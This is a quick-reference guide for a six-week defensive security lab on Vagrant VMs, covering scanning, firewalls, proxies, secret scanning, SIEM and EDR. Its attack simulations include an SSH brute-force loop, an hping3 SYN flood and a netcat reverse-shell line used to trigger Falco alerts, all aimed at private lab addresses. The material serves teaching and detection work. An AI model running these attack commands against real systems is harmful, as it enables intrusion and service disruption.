# Lab Quick Reference Guide

This guide provides quick commands and scenarios for each week's lab.

## VM Quick Start

### Starting VMs by Week

```bash
# Week 1 - Network Basics
vagrant up gateway attacker defender webserver

# Week 2 - Firewall
vagrant up gateway attacker defender webserver

# Week 3 - Proxy (Basic)
vagrant up attacker proxy webserver

# Week 3 - Proxy (Advanced HAProxy)
vagrant halt webserver
vagrant up attacker proxy web1 web2 web3

# Week 4 - DLP
# No VMs required (uses GitHub and local git)

# Week 5 - SIEM
vagrant up attacker defender logserver

# Week 6 - EDR
vagrant up attacker monitored
```

### Common VM Commands

```bash
# Check VM status
vagrant status

# SSH into a VM
vagrant ssh attacker
vagrant ssh defender
vagrant ssh webserver
vagrant ssh proxy
vagrant ssh logserver
vagrant ssh monitored

# Stop VMs
vagrant halt

# Restart specific VM
vagrant reload defender

# Destroy and recreate
vagrant destroy -f attacker
vagrant up attacker
```

## Week 1 - Network Basics

### Quick Attack Scenarios

```bash
# From attacker VM:
vagrant ssh attacker

# 1. Ping sweep
nmap -sn 192.168.210.0/24

# 2. Port scan
nmap -sS -p 1-1000 192.168.220.11

# 3. Service detection
sudo nmap -sV -p 22,80 192.168.220.11

# 4. HTTP request
curl http://192.168.230.20

# 5. Banner grabbing
nc -v 192.168.220.11 22
```

### Quick Defense Actions

```bash
# From defender VM:
vagrant ssh defender

# 1. Monitor traffic (basic)
sudo tcpdump -i eth1 -n 'src 192.168.210.10'

# 2. Monitor traffic (cleaner output)
sudo tcpdump -i eth1 -n -q 'src 192.168.210.10'

# 3. Monitor with better tools (install first)
sudo apt install -y iftop tcptrack nload tshark

# 4. Use visual monitoring tools
sudo iftop -i eth1                    # Visual bandwidth monitor
sudo tcptrack -i eth1                 # TCP connection states
sudo nload eth1                       # Bandwidth graphs

# 5. Save and analyze later with tshark
sudo tcpdump -i eth1 -w /tmp/capture.pcap 'src 192.168.210.10'
tshark -r /tmp/capture.pcap -q -z io,phs

# 6. Watch connections
watch -n 1 'ss -tan | grep ESTAB'

# 7. Check SSH logs
sudo journalctl -u ssh --since "5 minutes ago" | grep Failed

# 8. List listening ports
ss -tulpn
```

## Network Monitoring Tools Comparison

### When to Use Each Tool

| Tool | Use Case | Example |
|------|----------|---------|
| **tcpdump** | Raw packet capture | `sudo tcpdump -i eth1 -w scan.pcap` |
| **tshark** | Detailed analysis | `tshark -r scan.pcap -Y http` |
| **iftop** | Live bandwidth monitoring | `sudo iftop -i eth1` |
| **tcptrack** | Connection state tracking | `sudo tcptrack -i eth1` |
| **nload** | Simple bandwidth graphs | `sudo nload eth1` |

### Quick Monitoring Commands

```bash
# Cleaner tcpdump output
sudo tcpdump -i eth1 -n -q host 192.168.210.10

# Show only SYN packets (connection attempts)
sudo tcpdump -i eth1 'tcp[tcpflags] & (tcp-syn) != 0' -n

# Capture and analyze with tshark
sudo tcpdump -i eth1 -w /tmp/scan.pcap
tshark -r /tmp/scan.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport

# Real-time visualization
sudo iftop -i eth1 -f "host 192.168.210.10"
sudo tcptrack -i eth1 host 192.168.210.10

# Rotating captures (10MB files, keep 5)
sudo tcpdump -i eth1 -w capture.pcap -C 10 -W 5
```

## Week 2 - Firewall

### Quick Firewall Setup

**Best Practice:** Use configuration files instead of individual commands to avoid lockout risks.

```bash
# From defender VM:
vagrant ssh defender

# 1. Create default-deny config file
sudo tee /etc/nftables-default-deny.conf > /dev/null <<'EOF'
table inet filter {
  chain input {
    type filter hook input priority 0; policy drop;
    iif "lo" accept
    ct state established,related accept
    tcp dport 22 ct state new counter log prefix "SSH_ALLOW " accept
    icmp type echo-request counter log prefix "ICMP_ALLOW " accept
    counter log prefix "DROP "
  }
  chain forward {
    type filter hook forward priority 0; policy drop;
  }
  chain output {
    type filter hook output priority 0; policy accept;
    accept
  }
}
EOF

# 2. Apply configuration atomically (all rules at once, no lockout risk)
sudo nft -f /etc/nftables-default-deny.conf

# 3. View rules
sudo nft list ruleset

# 4. Monitor logs
sudo journalctl -kf | grep -E "DROP|SSH_ALLOW|ICMP_ALLOW"
```

### Quick Attack Tests

```bash
# From attacker VM:
vagrant ssh attacker

# 1. Test blocked port
curl --max-time 5 http://192.168.220.11:8888

# 2. Test allowed SSH
ssh vagrant@192.168.220.11 whoami

# 3. Port scan
nmap -sS -p 1-1000 192.168.220.11

# 4. SYN flood (educational only!)
sudo hping3 -S -p 80 --flood -c 100 192.168.220.11
```

## Week 3 - Proxy

### Quick Proxy Setup

```bash
# From proxy VM:
vagrant ssh proxy

# 0. Configure proxies (REQUIRED - not done automatically)
cd ~/proxy-config
./configure-squid.sh      # Configure and start Squid
./configure-nginx.sh      # Configure Nginx reverse proxy

# Or configure manually:
# sudo cp /etc/squid/squid.conf.example /etc/squid/squid.conf
# sudo systemctl enable squid && sudo systemctl start squid
# sudo cp /etc/nginx/sites-available/reverse-proxy.example /etc/nginx/sites-available/reverse-proxy
# sudo ln -sf /etc/nginx/sites-available/reverse-proxy /etc/nginx/sites-enabled/
# sudo systemctl reload nginx

# 1. Check Squid
sudo systemctl status squid
sudo tail -f /var/log/squid/access.log

# 2. Check Nginx reverse proxy
sudo nginx -t
sudo systemctl status nginx
sudo tail -f /var/log/nginx/reverse-proxy-access.log
```

### Quick Proxy Tests

```bash
# From attacker VM:
vagrant ssh attacker

# 1. Test forward proxy
curl -x http://192.168.210.21:3128 http://192.168.230.20

# 2. Test reverse proxy
curl http://192.168.210.21:8080

# 3. Test blocked admin
curl http://192.168.210.21:8080/admin

# 4. Monitor logs while testing
# (on proxy VM in separate terminal)
sudo tail -f /var/log/squid/access.log
```

## Week 4 - DLP

### Quick Secret Scanning

```bash
# Local machine or any VM:

# 1. Install pre-commit
pip install pre-commit

# 2. Setup hooks
pre-commit install

# 3. Run gitleaks
gitleaks detect --source . --verbose

# 4. Scan history
gitleaks detect --source . --log-opts="--all"

# 5. Test with fake secret
echo "password=SuperSecret123" > test.txt
git add test.txt
git commit -m "test"  # Should be blocked
rm test.txt
```

## Week 5 - SIEM

### Quick ELK Setup

```bash
# From logserver VM:
vagrant ssh logserver

# 1. Start ELK stack
cd /opt/elk
sudo docker-compose up -d

# 2. Wait for startup
until curl -s http://localhost:9200 > /dev/null; do sleep 5; done
echo "ELK is ready!"

# 3. Check indices
curl http://localhost:9200/_cat/indices?v

# 4. View logs
sudo docker-compose logs -f
```

### Quick Filebeat Setup

```bash
# From defender VM:
vagrant ssh defender

# 1. Start Filebeat
sudo systemctl start filebeat
sudo systemctl status filebeat

# 2. Check logs
sudo tail -f /var/log/filebeat/filebeat
```

### Quick Attack Simulation

```bash
# From attacker VM:
vagrant ssh attacker

# 1. SSH brute force
for i in {1..20}; do
  sshpass -p 'wrong' ssh -o ConnectTimeout=2 fakeuser$i@192.168.220.11 2>&1 | head -1
  sleep 1
done

# 2. Port scan
sudo nmap -sS -p 1-1000 192.168.220.11

# 3. Check in Kibana (http://localhost:5601)
# Search: host_role:defender AND message:"Failed password"
```

## Week 6 - EDR

### Quick Falco Setup

```bash
# From monitored VM:
vagrant ssh monitored

# 1. Start Falco
sudo docker run --rm -d \
  --name falco \
  --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /dev:/host/dev \
  -v /proc:/host/proc:ro \
  -v /etc/falco:/etc/falco \
  -v /var/log/falco:/var/log/falco \
  falcosecurity/falco:latest

# 2. Monitor alerts
sudo tail -f /var/log/falco/events.log

# 3. Check Falco status
sudo docker ps | grep falco
```

### Quick Attack Simulations

```bash
# From monitored VM:
vagrant ssh monitored

# 1. Container shell (triggers alert)
sudo docker run -d --name test nginx:alpine
sudo docker exec -it test /bin/sh
# (run some commands, then exit)

# 2. Simulate reverse shell
echo "nc -e /bin/bash 192.168.210.10 4444" > /tmp/test.sh
chmod +x /tmp/test.sh
/tmp/test.sh &
sleep 2
pkill -f test.sh

# 3. Check alerts
sudo grep -i "shell\|reverse" /var/log/falco/events.log
```

### Quick Osquery Investigation

```bash
# From monitored VM:
vagrant ssh monitored

# 1. Check processes
osqueryi "SELECT pid, name, cmdline FROM processes WHERE uid >= 1000;"

# 2. Check network
osqueryi "SELECT * FROM listening_ports WHERE port < 1024;"

# 3. Check users
osqueryi "SELECT * FROM users WHERE uid >= 1000;"

# 4. Check SSH keys
osqueryi "SELECT * FROM authorized_keys;"
```

## Network Map

```
192.168.210.5  - gateway    (NAT, routing, gateway firewall)
192.168.210.10 - attacker   (Red team operations)
192.168.220.11 - defender   (Blue team, firewall)
192.168.230.20 - webserver  (Target web app)
192.168.230.31 - web1       (Backend server #1 for HAProxy)
192.168.230.32 - web2       (Backend server #2 for HAProxy)
192.168.230.33 - web3       (Backend server #3 for HAProxy)
192.168.210.21 - proxy      (Squid + Nginx + HAProxy)
192.168.210.30 - logserver  (ELK stack)
192.168.220.40 - monitored  (Falco + Osquery)
```

## Gateway and NAT Quick Reference

### Starting Gateway

```bash
# Start gateway with other VMs
vagrant up gateway attacker defender webserver

# SSH into gateway
vagrant ssh gateway

# Check gateway status
./gateway-config/status.sh
```

### Gateway Configuration

```bash
# View NAT configuration
sudo nft list table ip nat

# View firewall rules
sudo nft list table inet filter

# Check IP forwarding status
sysctl net.ipv4.ip_forward

# View connection tracking
sudo conntrack -L

# Count active NAT connections
sudo conntrack -L | wc -l
```

### Gateway Firewall Scenarios

```bash
# From gateway VM:
vagrant ssh gateway

# 1. Monitor all forwarded traffic
sudo journalctl -kf | grep GATEWAY_FWD

# 2. Add rule to block specific port through gateway
sudo nft add rule inet filter forward tcp dport 8888 counter log prefix "GW_BLOCK_8888 " drop

# 3. Allow only HTTP/HTTPS through gateway
sudo nft add rule inet filter forward tcp dport { 80, 443 } accept
sudo nft add rule inet filter forward counter log prefix "GW_BLOCK_OTHER " drop

# 4. Rate limit connections through gateway
sudo nft add rule inet filter forward ct state new limit rate 10/minute accept
sudo nft add rule inet filter forward ct state new counter log prefix "GW_RATE_LIMIT " drop

# 5. Configure port forwarding (DNAT)
sudo nft add table ip nat
sudo nft add chain ip nat prerouting '{ type nat hook prerouting priority -100; }'
sudo nft add rule ip nat prerouting iifname "eth0" tcp dport 8080 dnat to 192.168.230.20:80

# 6. View connection tracking in real-time
sudo conntrack -E
```

### Testing Gateway/NAT

```bash
# From attacker VM:
vagrant ssh attacker

# 1. Add route through gateway
sudo ip route add 10.0.0.0/24 via 192.168.210.5

# 2. View routing table
ip route

# 3. Trace route through gateway
traceroute -n 192.168.230.20

# On gateway, monitor
vagrant ssh gateway
sudo tcpdump -i any -n 'not port 22'
```

### Gateway vs Proxy Comparison

| Feature | Gateway (Layer 3-4) | Proxy (Layer 7) |
|---------|---------------------|-----------------|
| **Protocol** | IP, TCP, UDP | HTTP, HTTPS, FTP |
| **Transparency** | Transparent routing | May require client config |
| **Inspection** | Port/IP only | Full HTTP headers/URLs |
| **Caching** | No | Yes |
| **NAT** | Yes | No (but can modify URLs) |
| **Use Case** | Network routing | Application filtering |

### Common Gateway Attack/Defense

```bash
# Defense: Block port scan through gateway
vagrant ssh gateway
sudo nft add rule inet filter forward tcp flags syn limit rate 20/second accept
sudo nft add rule inet filter forward tcp flags syn counter log prefix "GW_SCAN " drop

# Attack: Test from attacker
vagrant ssh attacker
sudo nmap -sS -p 1-1000 192.168.230.20

# Defense: Monitor on gateway
vagrant ssh gateway
sudo journalctl -k --since "1 minute ago" | grep GW_SCAN | wc -l
```

## Common Attack Chain

### 1. Reconnaissance (Week 1)
```bash
vagrant ssh attacker
nmap -sn 192.168.210.0/24          # Host discovery
nmap -sS -p 1-1000 192.168.220.11  # Port scan
nmap -sV -p 22,80 192.168.220.11   # Service detection
```

### 2. Access Attempt (Week 2)
```bash
# SSH brute force
for i in {1..10}; do
  sshpass -p 'test' ssh user$i@192.168.220.11
done

# Check if firewall blocks
curl --max-time 5 http://192.168.220.11:8888
```

### 3. Exploitation (Week 3)
```bash
# Try proxy bypass
curl -x http://192.168.210.21:3128 http://192.168.220.11:22

# Try admin access
curl http://192.168.210.21:8080/admin
```

### 4. Detection (Week 5)
```bash
# Check in Kibana
# http://localhost:5601
# Query: source.ip:192.168.210.10 AND event.action:*failed*
```

### 5. Response (Week 6)
```bash
vagrant ssh monitored

# Block attacker
sudo nft add table inet security
sudo nft add chain inet security input '{ type filter hook input priority 0; }'
sudo nft add rule inet security input ip saddr 192.168.210.10 drop

# Verify
sudo nft list ruleset | grep security
```

## Troubleshooting

### VM won't start
```bash
# Check libvirt service
systemctl is-active libvirtd

# List VMs
virsh list --all

# Check logs
VAGRANT_LOG=info vagrant up attacker

# Restart networking
vagrant reload attacker
```

### Can't SSH into VM
```bash
# Check VM is running
vagrant status

# Try from host
vagrant ssh attacker

# Check SSH service in VM
vagrant ssh attacker -c "sudo systemctl status sshd"
```

### VMs can't reach each other
```bash
# Check IP addresses
vagrant ssh attacker -c "ip addr show eth1"

# Test connectivity
vagrant ssh attacker -c "ping -c 3 192.168.220.11"

# Check firewall
vagrant ssh defender -c "sudo nft list ruleset"
```

### Out of memory
```bash
# Stop unused VMs
vagrant halt webserver proxy logserver

# Run only required VMs for current week
```

### Port forwarding not working
```bash
# Check port not in use on host
lsof -i :8080

# Reload VM
vagrant reload webserver

# Check service in VM
vagrant ssh webserver -c "sudo systemctl status nginx"
```

## Tips

1. **Use tmux/screen** for monitoring multiple VMs simultaneously
2. **Take snapshots** before major changes: `vagrant snapshot save <name>`
3. **Check logs** when something doesn't work: `sudo journalctl -xe`
4. **Read error messages** carefully - they usually tell you what's wrong
5. **Start simple** and add complexity incrementally
6. **Document findings** as you go - you'll need them for your portfolio

## Resources

- [VM Setup Guide](VM-SETUP.md) - Detailed VM configuration
- [Vagrant Docs](https://www.vagrantup.com/docs)
- [nftables Wiki](https://wiki.nftables.org/)
- [Nginx Docs](https://nginx.org/en/docs/)
- [ELK Documentation](https://www.elastic.co/guide/)
- [Falco Docs](https://falco.org/docs/)
- [Osquery Docs](https://osquery.io/docs/)
